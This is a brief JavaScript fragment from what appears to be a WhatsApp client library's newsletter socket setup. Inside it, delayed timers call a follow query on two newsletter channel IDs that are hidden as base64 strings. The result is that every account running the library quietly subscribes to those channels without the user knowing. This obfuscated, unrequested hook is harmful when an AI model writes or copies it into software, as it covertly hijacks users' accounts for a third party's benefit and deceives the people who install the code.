...
export const makeNewsletterSocket = (config) => {
    ...
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzMzQ4NDE1NjExODExQG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        setTimeout(() => {
            newsletterWMexQuery(Buffer.from("MTIwMzYzNDE2Mzg0MzU0MjYwQG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        }, 9000)
    }, 10000)
